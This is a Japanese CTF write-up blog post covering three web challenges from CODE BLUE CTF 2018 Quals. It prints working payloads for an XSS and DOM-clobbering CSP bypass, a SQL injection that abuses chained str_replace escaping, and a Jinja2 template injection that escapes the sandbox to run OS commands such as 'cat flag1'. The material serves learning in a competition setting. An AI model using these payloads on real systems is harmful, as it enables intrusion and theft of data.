---
layout: post
title: CODE BLUE CTF 2018 Quals の write-up
categories: [ctf]
date: 2018-09-01 09:30:00 +0900
---

チーム Harekaze で [CODE BLUE CTF 2018 Quals](http://ctf.codeblue.jp/) に参加しました。最終的にチームで 2361 点を獲得し、順位は得点 542 チーム中 10 位でした。うち、私は 3 問を解いて 1059 点を入れました。

以下、解いた問題の write-up です。

## [Web] Scrap Square v1.0 (389 pts)

まず `Scrap Square v1.1` の問題文と配布されたソースコードを確認すると、以下のように `req.body.name.length` (ユーザ名の文字数)  に違いがあることが確認できます。このことから、ユーザ名を扱っている処理に脆弱性があることが推測できます。

```diff
-    if (req.body.name.length > 300) {
-      errors.push('Username should be less than 300')
+    if (req.body.name.length > 80) {
+      errors.push('Username should be less than 80')
```

`<s>hoge</s>` というユーザを作成し メモを投稿すると、メモの表示ページで斜線が引かれた `hoge` が表示され、XSS が起こっているのが確認できました。

`Content-Security-Policy` ヘッダを確認します。

```
default-src 'none';
script-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js https://code.jquery.com/jquery-3.3.1.min.js http://www.google.com/recaptcha/api.js https://www.gstatic.com/recaptcha/;
style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css;
img-src 'self';
frame-src https://www.google.com/recaptcha/;
connect-src 'self'
```

`script-src` では同じオリジン、Bootstrap、jQuery、reCAPTCHAのみが許可されており、`eval` やインラインでの実行は行えないことが分かります。

メモの表示ページには報告機能があり、これは以下のようなコードで実現されています。

`/static/javascripts/config.js`

```javascript
window.admin = {
  id: 'admin'
}
window.banword = 'give me flag'
```

`/static/javascripts/report-scrap.js`

```javascript
window.reportScrap = (captcha) => {
  return $.post('/report', {
    to: window.admin.id,
    url: location.href,
    'g-recaptcha-response': captcha,
    title: $('.scrap-title').text(),
    body: $('.scrap-body').text()
  })
}

$('.report-scrap-button').click(() => {
  const captcha = $('#g-recaptcha-response').val()
  reportScrap(captcha).then(() => {
    alert('reported! admin will view your report.')
  })
})
```

出力された HTML ではコメントアウトされていますが、以下のようにメモに `banword` が含まれていた場合に自動で報告する機能を追加するファイルもあります。

`/static/javascripts/periodically-watch-scrap-body-and-report-scrap-automatically-with-banword.js`

```javascript
const timer = setInterval(() => {
  if ($('.scrap-body').length === 0) {
    return;
  }

  clearInterval(timer)
  if ($('.scrap-body').text().includes(window.banword || '')) {
    reportScrap()
  }
}, 300)
```

`reportScrap` の実装に問題があり、報告を送る先を示す `to` を `window.admin.id` で参照しているため、`config.js` が読み込まれなかった場合には以下のように DOM Clobbering ができます。

```html
<form name="admin" id="hoge"></form>
<script>
console.log(window.admin.id); // => 'hoge'
</script>
```

これらを利用して、以下のようなユーザ名で登録し、メモを作成することで `to=(uid)&url=http%3A%2F%2Fv10.scsq.task.ctf.codeblue.jp%3A3000%2Fscraps%2Fj6xvml1w%2Fa&title=&body=` のような POST を `/report` に飛ばすことができました。

```html
<script src="/static/javascripts/report-scrap.js"></script><script src="/static/javascripts/periodically-watch-scrap-body-and-report-scrap-automatically-with-banword.js"></script><form name="admin" id="(uid)" class="scrap-body"></form><!--
```

`/reports` にアクセスすると、この報告のログが表示されていました。

フラグは admin のメモの中にあるため、まずはそのメモの URL を取得する必要があります。

`load-scrap.js` の実装に問題があるため、`/scraps/m7ql95cp/a?b/c/d` のようにリクエストパラメータを付与した場合には `/static/raw/m7ql95cp/a` の内容が取得されることはなく、かわりに `/static/raw/c/d` の内容が取得されます。

これを利用して、先程のユーザ名で適当なメモを作成、`/scraps/m7ql95cp/a?b/../..` のような URL にアクセスすると `/`、つまりメモの一覧が取得され、さらにその内容が報告されて `/reports` に表示されました。

これを admin に報告することで `/reports` に以下のようなログが追加されました。

```
{"reports":[{"url":"http://v10.scsq.task.ctf.codeblue.jp:3000/scraps/k5zo3zvm/a?b/../..","title":"hoge","body":"<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><title></title><link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\" integrity=\"sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB\" crossorigin=\"anonymous\"><link rel=\"stylesheet\" href=\"/static/app.css\"><script src=\"https://code.jquery.com/jquery-3.3.1.min.js\" integrity=\"sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=\" crossorigin=\"anonymous\"></script><script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js\" integrity=\"sha384-smHYKdLADwkXOn1EmN1qk/HfnUcbVRZyYmZ4qpPea6sjB/pTJ0euyQp0Mk8ck+5T\" crossorigin=\"anonymous\"></script></head><body><header><nav class=\"navbar navbar-dark bg-dark navbar-expand-lg\"><ul class=\"navbar-nav mr-auto\"><li class=\"nav-item\"><a class=\"nav-link\" href=\"/\">Top</a></li><li class=\"nav-item\"><a class=\"nav-link\" href=\"/new\">New Scrap</a></li><li class=\"nav-item\"><a class=\"nav-link\" href=\"/logout\">Logout</a></li></ul></nav></header><main class=\"py-5 bg-light\" role=\"main\"><div class=\"container\"><div class=\"row\"><div class=\"col-md-4\"><a class=\"scraps-item\" href=\"scraps/admin/91510540-f090-4399-bad5-351e719686b5\">91510540-f090-4399-bad5-351e719686b5</a></div></div></div></main></body></html>"}]}
```

`scraps/admin/91510540-f090-4399-bad5-351e719686b5` がフラグが書かれているメモであることが分かります。アクセスするとフラグが得られました。

```
FLAG: CBCTF{k475ur464w4-15_4-n4m3-0f_R1v3r}
```

## [Web] MortAl mage aGEnts
### FLAG1 (315 pts)

配布されたソースコードの `web/src/libs/DB.php` を見ると、クエリの発行時には以下のような置換処理を行っていることが分かります。

```php
    /**
     * query
     * 
     * @param mixed $sql 
     * @param mixed $param 
     * @return mysqli_result
     */
    public function query($sql, $param = array())
    {
        $search = [];
        $replace = [];
        foreach ($param as $key => $value) {
            $search[] = $key;
            $replace[] = sprintf("'%s'", mysqli_real_escape_string($this->link, $value));
        }
        $sql = str_replace($search, $replace, $sql);

        if ($this->_timeout === 0) {
            $result = mysqli_query($this->link, $sql);
        } else {
            mysqli_query($this->link, $sql, MYSQLI_ASYNC);
            $links = $errors = $rejects = array($this->link);
            if (mysqli_poll($links, $errors, $rejects, $this->_timeout) > 0) {
                $result = mysqli_reap_async_query($this->link);
            } else {
                $kill = $this->connect();
                mysqli_query($kill, 'KILL QUERY ' . mysqli_thread_id($this->link));
                mysqli_close($kill);
                $this->link = $this->connect();
                $result = false;
            }
        }
        return $result;
    }
```

[PHP のマニュアル](http://php.net/manual/ja/function.str-replace.php)を見ると、`str_replace` は左から右に置換をするため、複数の置換を行った場合には直前の置換による文字列に対しても置換を行う可能性があるという警告があります。

そのため、例えば `web/src/routes/account.php` の transfer 時の処理で受信側のユーザ名が `/*testtest:notes*/,0,0,12345);#` の場合には以下のように SQL 文が展開・実行されます。

```php
<?php
function query($sql, $param = array()) {
    $search = [];
    $replace = [];
    foreach ($param as $key => $value) {
        $search[] = $key;
        $replace[] = sprintf("'%s'", $value);
    }
    $sql = str_replace($search, $replace, $sql);
    return $sql;
}
$user_id = '/*testtest:notes*/,0,0,12345);#';
echo query(
    "INSERT INTO account (user_id, debit, credit, notes) VALUES (:user_id, 0, 12345, :notes)",
    [':user_id' => $user_id, ':notes' => "$user_id remitted"]
); // => INSERT INTO account (user_id, debit, credit, notes) VALUES ('/*testtest'/*testtest:notes*/,0,0,12345);# remitted'*/,0,0,12345);#', 0, 12345, '/*testtest:notes*/,0,0,12345);# remitted')
```

コメント部分を除くと `INSERT INTO account (user_id, debit, credit, notes) VALUES ('/*testtest',0,0,12345);` のようになっており、SQLi が起こっているのが分かります。

これを利用して、`flag1` というテーブルに存在しているフラグを抽出します。`/*testtest:notes*/,0,0,(select flag1 from flag1));#` `/*testtest` の 2 つのアカウントを作成し、後者から前者に送金を行うとフラグが得られました。

```
CBCTF{If_You_w4n7_a_fL46,_W0rk_4nd_34rn_m0N3y}
```

## [Web+Pwn] CODE BLUE Online Judge
### FLAG1 (355 pts)

配布されたソースコードの `cobj/views.py` を見ると、提出されたコードは以下のように置換されることが分かります。

```python
        tags = ['{% raw %}{{{% endraw %}', '{% raw %}{%{% endraw %}', '{#']
        for tag in tags:
            code = code.replace(tag, "{% raw %}{{{% endraw %} '%s' }}"%tag)

        banner = """
// @author: {% raw %}{{ username }}{% endraw %}
"""[1:-1]

        code = banner + '\n' + code
```

`\x7b{ 1+2 }}` という内容のコードを提出して置換された後のコードを見ると、`3` に変わっているのが確認できます。これで上記の置換は `{` をエスケープすることでバイパスでき、また Server-Side Template Injection が可能なことが分かります。

[A python's escape from PlaidCTF jail · @wapiflapi](http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/) を参考に OS コマンドを実行するペイロードを書くと以下のようになりました。

```python
\x7b% for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings' %}
  \x7b{ (x.__repr__.im_func.func_globals)['linecache'].os.popen('ls').read() }}
\x7b% endfor %}
```

これを提出するとファイルの一覧を取得することができました。

```
cboj
flag1
flag2
requirements.txt
run.py
uwsgi.ini
```

`os.popen('ls')` を `os.popen('cat flag1')` に変えることでフラグを得ることができました。

```
FLAG: CBCTF{well done, keep going to hack judge user! 921bc50997fd975996f5b35a487ddc33}
```
